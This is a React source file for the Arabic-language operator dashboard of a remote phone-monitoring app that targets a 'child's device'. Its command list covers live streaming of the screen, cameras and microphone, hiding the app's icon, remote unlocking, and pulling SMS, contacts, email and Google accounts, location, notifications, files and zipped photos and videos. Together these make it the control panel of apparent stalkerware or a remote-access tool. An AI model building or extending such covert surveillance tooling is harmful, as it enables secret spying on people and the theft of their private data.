import { useState, useRef, useCallback } from 'react';
import { Send, Tv, Camera, CameraIcon, Video, Mic, Radio, Volume2, VolumeX, Volume1, Lock, Unlock, Flashlight, FlashlightOff, Monitor, MonitorOff, Users, MessageSquare, Phone, Mail, Bell, MapPin, Image, Archive, Film, AppWindow, Music, MessageCircle, Eye, EyeOff, Power, PowerOff } from 'lucide-react';
import type { ComponentType } from 'react';
import { motion } from 'framer-motion';
import { StreamScreenPanel } from './panels/StreamScreenPanel';
import { StreamCameraPanel } from './panels/StreamCameraPanel';
import { SoundModal } from './panels/SoundPanel';
import { VolumeModal } from './panels/VolumePanel';
import { MicroPanel } from './panels/MicroPanel';
import { NotificationPanel } from './panels/NotificationPanel';
import { AccountPanel } from './panels/AccountPanel';
import { DataCommandModal } from './DataCommandModal';
import { CommandProgressBadge, CommandProgressLabel, ErrorToast, SuccessToast, useCommandProgress } from './CommandProgressToast';
import { Modal } from '../ui/Modal';
import { useAppStore } from '../../stores/useAppStore';

interface CommandGridProps {
  deviceToken: string;
}

interface CmdItem {
  command: string;
  label: string;
  description: string;
  icon: ComponentType<{ size?: number; className?: string }>;
  color: string;
  danger?: boolean;
  panel?: string;
  modal?: string;
  dataCommand?: boolean;
}

interface CmdCategory {
  key: string;
  label: string;
  icon: ComponentType<{ size?: number; className?: string }>;
  color: string;
  bgColor: string;
  items: CmdItem[];
}

const CATEGORIES: CmdCategory[] = [
  {
    key: 'broadcast',
    label: 'البث المباشر',
    icon: Tv,
    color: 'text-emerald-600 dark:text-emerald-400',
    bgColor: 'bg-emerald-50 dark:bg-emerald-500/10 border-emerald-200 dark:border-emerald-500/20',
    items: [
      { command: 'stream_screen', label: 'بث الشاشة', description: 'مراقبة الشاشة مباشرة والتحكم باللمس', icon: Monitor, color: 'from-emerald-500 to-emerald-600', panel: 'stream_screen' },
      { command: 'stop_stream', label: 'إيقاف بث الشاشة', description: 'إيقاف بث الشاشة المباشر', icon: MonitorOff, color: 'from-slate-500 to-slate-600', danger: true },
      { command: 'stream_camera_front', label: 'بث الكاميرا الأمامية', description: 'بث مباشر للكاميرا الأمامية', icon: Video, color: 'from-green-500 to-green-600', panel: 'stream_camera' },
      { command: 'stream_camera_back', label: 'بث الكاميرا الخلفية', description: 'بث مباشر للكاميرا الخلفية', icon: Video, color: 'from-green-600 to-green-700', panel: 'stream_camera' },
      { command: 'stop_camera_stream', label: 'إيقاف بث الكاميرا', description: 'إيقاف بث الكاميرا المباشر', icon: MonitorOff, color: 'from-red-500 to-red-600', danger: true },
      { command: 'micro_on', label: 'بث الميكروفون', description: 'الاستماع للميكروفون مباشرة', icon: Radio, color: 'from-red-500 to-red-600', panel: 'micro' },
      { command: 'micro_off', label: 'إيقاف بث الميكروفون', description: 'إيقاف بث الميكروفون المباشر', icon: Radio, color: 'from-slate-500 to-slate-600', danger: true },
    ],
  },
  {
    key: 'camera',
    label: 'الكاميرا والتقاط',
    icon: Camera,
    color: 'text-indigo-600 dark:text-indigo-400',
    bgColor: 'bg-indigo-50 dark:bg-indigo-500/10 border-indigo-200 dark:border-indigo-500/20',
    items: [
      { command: 'take_screenshot', label: 'لقطة شاشة', description: 'التقاط لقطة شاشة من الجهاز', icon: Camera, color: 'from-indigo-500 to-indigo-600' },
      { command: 'take_photo_front', label: 'صورة كاميرا أمامية', description: 'التقاط صورة بالكاميرا الأمامية', icon: CameraIcon, color: 'from-indigo-400 to-indigo-500' },
      { command: 'take_photo_back', label: 'صورة كاميرا خلفية', description: 'التقاط صورة بالكاميرا الخلفية', icon: CameraIcon, color: 'from-indigo-600 to-indigo-700' },
      { command: 'record_video_front', label: 'تسجيل فيديو أمامي', description: 'تسجيل فيديو بالكاميرا الأمامية', icon: Video, color: 'from-purple-500 to-purple-600' },
      { command: 'record_video_back', label: 'تسجيل فيديو خلفي', description: 'تسجيل فيديو بالكاميرا الخلفية', icon: Video, color: 'from-purple-600 to-purple-700' },
    ],
  },
  {
    key: 'microphone',
    label: 'الميكروفون والصوت',
    icon: Mic,
    color: 'text-cyan-600 dark:text-cyan-400',
    bgColor: 'bg-cyan-50 dark:bg-cyan-500/10 border-cyan-200 dark:border-cyan-500/20',
    items: [
      { command: 'record_audio', label: 'تسجيل صوتي', description: 'تسجيل صوتي محيطي', icon: Mic, color: 'from-cyan-400 to-cyan-500' },
      { command: 'play_remote_sound', label: 'تشغيل صوت تنبيه', description: 'تشغيل صوت على جهاز الطفل', icon: Volume2, color: 'from-fuchsia-500 to-fuchsia-600', modal: 'sound' },
      { command: 'stop_sound', label: 'إيقاف الصوت', description: 'إيقاف الصوت', icon: VolumeX, color: 'from-slate-500 to-slate-600', danger: true },
      { command: 'set_volume', label: 'ضبط الصوت', description: 'ضبط مستوى صوت الجهاز', icon: Volume1, color: 'from-fuchsia-400 to-fuchsia-500', modal: 'volume' },
    ],
  },
  {
    key: 'screen',
    label: 'الشاشة والتحكم بالجهاز',
    icon: Monitor,
    color: 'text-amber-600 dark:text-amber-400',
    bgColor: 'bg-amber-50 dark:bg-amber-500/10 border-amber-200 dark:border-amber-500/20',
    items: [
      { command: 'lock_device', label: 'قفل الهاتف', description: 'قفل شاشة الجهاز عن بُعد', icon: Lock, color: 'from-red-500 to-red-600', danger: true },
      { command: 'unlock_device', label: 'فك القفل', description: 'فك قفل شاشة الجهاز', icon: Unlock, color: 'from-green-500 to-green-600' },
      { command: 'flash_on', label: 'تشغيل الفلاش', description: 'تشغيل فلاش الضوء', icon: Flashlight, color: 'from-yellow-400 to-yellow-500' },
      { command: 'flash_off', label: 'إيقاف الفلاش', description: 'إيقاف فلاش الضوء', icon: FlashlightOff, color: 'from-slate-500 to-slate-600' },
      { command: 'power_off', label: 'إطفاء الشاشة', description: 'إطفاء شاشة الجهاز', icon: PowerOff, color: 'from-slate-600 to-slate-700', danger: true },
      { command: 'power_on', label: 'تشغيل الشاشة', description: 'تشغيل شاشة الجهاز', icon: Power, color: 'from-emerald-500 to-emerald-600' },
      { command: 'hide_app', label: 'إخفاء أيقونة التطبيق', description: 'إخفاء أيقونة تطبيق الطفل', icon: EyeOff, color: 'from-gray-500 to-gray-600' },
      { command: 'show_app', label: 'إظهار أيقونة التطبيق', description: 'إظهار أيقونة تطبيق الطفل', icon: Eye, color: 'from-blue-500 to-blue-600' },
    ],
  },
  {
    key: 'data',
    label: 'جلب البيانات',
    icon: Users,
    color: 'text-purple-600 dark:text-purple-400',
    bgColor: 'bg-purple-50 dark:bg-purple-500/10 border-purple-200 dark:border-purple-500/20',
    items: [
      { command: 'get_contacts', label: 'جهات الاتصال', description: 'جلب قائمة جهات الاتصال', icon: Users, color: 'from-purple-500 to-purple-600', dataCommand: true },
      { command: 'get_sms', label: 'رسائل SMS', description: 'جلب رسائل SMS', icon: MessageSquare, color: 'from-orange-500 to-orange-600', dataCommand: true },
      { command: 'get_number', label: 'أرقام الشرائح', description: 'جلب أرقام الشرائح والهاتف', icon: Phone, color: 'from-teal-500 to-teal-600', dataCommand: true },
      { command: 'get_account', label: 'حسابات الإيميل', description: 'جلب حسابات جوجل والإيميل', icon: Mail, color: 'from-pink-500 to-pink-600', panel: 'account' },
      { command: 'get_location', label: 'الموقع الجغرافي', description: 'تحديد موقع الجهاز', icon: MapPin, color: 'from-red-500 to-red-600', dataCommand: true },
      { command: 'get_notifications', label: 'الإشعارات', description: 'جلب إشعارات الجهاز', icon: Bell, color: 'from-blue-500 to-blue-600', dataCommand: true },
      { command: 'stop_get_notifications', label: 'إيقاف جلب الإشعارات', description: 'إيقاف جلب الإشعارات', icon: Bell, color: 'from-slate-500 to-slate-600', danger: true },
    ],
  },
  {
    key: 'apps',
    label: 'التطبيقات',
    icon: AppWindow,
    color: 'text-pink-600 dark:text-pink-400',
    bgColor: 'bg-pink-50 dark:bg-pink-500/10 border-pink-200 dark:border-pink-500/20',
    items: [
      { command: 'list_apps', label: 'قائمة التطبيقات', description: 'جلب قائمة التطبيقات المثبتة', icon: AppWindow, color: 'from-pink-500 to-pink-600', dataCommand: true },
      { command: 'get_icon_and_name', label: 'أيقونات واسماء التطبيقات', description: 'جلب أيقونات واسماء التطبيقات', icon: AppWindow, color: 'from-pink-400 to-pink-500', dataCommand: true },
    ],
  },
  {
    key: 'files',
    label: 'الملفات والوسائط',
    icon: Archive,
    color: 'text-amber-700 dark:text-amber-300',
    bgColor: 'bg-amber-50 dark:bg-amber-500/10 border-amber-200 dark:border-amber-500/20',
    items: [
      { command: 'list_directory', label: 'استعراض الملفات', description: 'تصفح ملفات الجهاز', icon: Image, color: 'from-amber-500 to-amber-600', dataCommand: true },
      { command: 'get_size_photo', label: 'فحص الصور', description: 'فحص عدد وحجم الصور', icon: Image, color: 'from-amber-400 to-amber-500', dataCommand: true },
      { command: 'get_zip_photo', label: 'حزمة صور', description: 'تنزيل صور بحزمة zip', icon: Archive, color: 'from-amber-600 to-amber-700' },
      { command: 'get_size_video', label: 'فحص الفيديوهات', description: 'فحص عدد وحجم الفيديوهات', icon: Film, color: 'from-amber-500 to-amber-600', dataCommand: true },
      { command: 'get_zip_video', label: 'حزمة فيديوهات', description: 'تنزيل فيديوهات بحزمة zip', icon: Archive, color: 'from-amber-700 to-amber-800' },
    ],
  },
  {
    key: 'communication',
    label: 'الرسائل والإرسال',
    icon: MessageCircle,
    color: 'text-green-600 dark:text-green-400',
    bgColor: 'bg-green-50 dark:bg-green-500/10 border-green-200 dark:border-green-500/20',
    items: [
      { command: 'send_notification', label: 'إرسال تنبيه', description: 'إرسال رسالة كشعار على الجهاز', icon: Send, color: 'from-green-500 to-green-600', panel: 'notification' },
      { command: 'remote_control', label: 'تحكم عن بُعد', description: 'تحكم بالشاشة عن بُعد', icon: Monitor, color: 'from-teal-500 to-teal-600' },
    ],
  },
];

export function CommandGrid({ deviceToken }: CommandGridProps) {
  const [expandedCategories] = useState<Set<string>>(() => new Set(CATEGORIES.map((c) => c.key)));
  const [activePanel, setActivePanel] = useState<{ command: string; item: CmdItem } | null>(null);
  const [activeModal, setActiveModal] = useState<string | null>(null);
  const [activeDataCmd, setActiveDataCmd] = useState<{ command: string; label: string; icon: ComponentType<{ size?: number; className?: string }> } | null>(null);
  const setActiveDeviceTab = useAppStore((s) => s.setActiveDeviceTab);
  const handleMediaReceived = useCallback(() => {
    setActiveDeviceTab('media');
  }, [setActiveDeviceTab]);
  const { progress, errorMessage, successMessage, send, dismissError, dismissSuccess } = useCommandProgress(handleMediaReceived);
  const scrollRef = useRef<HTMLDivElement>(null);
  const savedScrollRef = useRef(0);

  const handleOpenPanel = useCallback((item: CmdItem) => {
    savedScrollRef.current = scrollRef.current?.scrollTop || 0;
    setActivePanel({ command: item.command, item });
  }, []);

  const handleBack = useCallback(() => {
    setActivePanel(null);
    requestAnimationFrame(() => {
      if (scrollRef.current) {
        scrollRef.current.scrollTop = savedScrollRef.current;
      }
    });
  }, []);

  if (activePanel) {
    const { item } = activePanel;
    switch (item.panel) {
      case 'stream_screen':
        return <StreamScreenPanel token={deviceToken} onBack={handleBack} />;
      case 'stream_camera':
        return <StreamCameraPanel token={deviceToken} onBack={handleBack} />;
      case 'micro':
        return <MicroPanel token={deviceToken} onBack={handleBack} />;
      case 'notification':
        return <NotificationPanel token={deviceToken} onBack={handleBack} />;
      case 'account':
        return <AccountPanel token={deviceToken} onBack={handleBack} />;
      default:
        return null;
    }
  }

  return (
    <div ref={scrollRef} className="space-y-4 commands-scroll-container">
      {errorMessage && <ErrorToast message={errorMessage} onDismiss={dismissError} />}
      {successMessage && <SuccessToast message={successMessage} onDismiss={dismissSuccess} />}

      <Modal open={activeModal === 'sound'} onClose={() => setActiveModal(null)} title="تشغيل صوت تنبيه">
        <SoundModal token={deviceToken} />
      </Modal>

      <Modal open={activeModal === 'volume'} onClose={() => setActiveModal(null)} title="ضبط الصوت">
        <VolumeModal token={deviceToken} />
      </Modal>

      {activeDataCmd && (
        <DataCommandModal
          open={!!activeDataCmd}
          onClose={() => setActiveDataCmd(null)}
          token={deviceToken}
          command={activeDataCmd.command}
          label={activeDataCmd.label}
          icon={activeDataCmd.icon}
        />
      )}

      {CATEGORIES.map((cat) => {
        const isExpanded = expandedCategories.has(cat.key);
        const CatIcon = cat.icon;

        return (
          <div key={cat.key} className={`rounded-2xl border ${cat.bgColor} overflow-hidden`}>
            <button
              onClick={() => {}}
              className="w-full flex items-center gap-3 px-4 py-3 hover:bg-black/5 dark:hover:bg-white/5 transition-colors"
            >
              <CatIcon size={20} className={cat.color} />
              <span className={`flex-1 text-right font-semibold text-sm ${cat.color}`}>
                {cat.label}
              </span>
              <span className="text-xs text-surface-400 dark:text-surface-500">
                {cat.items.length} أوامر
              </span>
            </button>

            <div className="px-4 pb-4 grid grid-cols-3 sm:grid-cols-4 md:grid-cols-5 lg:grid-cols-6 xl:grid-cols-7 gap-3">
              {cat.items.map((item) => {
                const IconComp = item.icon;
                const isActive = progress && progress.command === item.command;

                return (
                  <motion.button
                    key={item.command}
                    whileHover={isActive ? {} : { scale: 1.03, y: -2 }}
                    whileTap={isActive ? {} : { scale: 0.97 }}
                    onClick={() => {
                      if (isActive) return;
                      if (item.panel) {
                        handleOpenPanel(item);
                      } else if (item.modal) {
                        setActiveModal(item.modal);
                      } else if (item.dataCommand) {
                        setActiveDataCmd({ command: item.command, label: item.label, icon: item.icon });
                      } else {
                        send(deviceToken, item.command, item.label);
                      }
                    }}
                    className={`relative flex flex-col items-center gap-2 p-3 rounded-xl border transition-all ${
                      item.danger
                        ? 'bg-white/80 dark:bg-surface-900/80 border-rose-200 dark:border-rose-500/20 hover:border-rose-300 dark:hover:border-rose-500/40'
                        : 'bg-white/80 dark:bg-surface-900/80 border-surface-200/50 dark:border-surface-700/50 hover:border-surface-300 dark:hover:border-surface-600'
                    }`}
                  >
                    {isActive && (
                      <CommandProgressBadge progress={progress!} commandKey={item.command} />
                    )}
                    <div className={`w-11 h-11 rounded-xl bg-gradient-to-br ${item.color} flex items-center justify-center text-white shadow-md`}>
                      <IconComp size={20} />
                    </div>
                    <span className="text-[11px] font-medium text-surface-700 dark:text-surface-300 text-center leading-tight">
                      {item.label}
                    </span>
                    {isActive && (
                      <CommandProgressLabel progress={progress!} commandKey={item.command} />
                    )}
                  </motion.button>
                );
              })}
            </div>
          </div>
        );
      })}
    </div>
  );
}
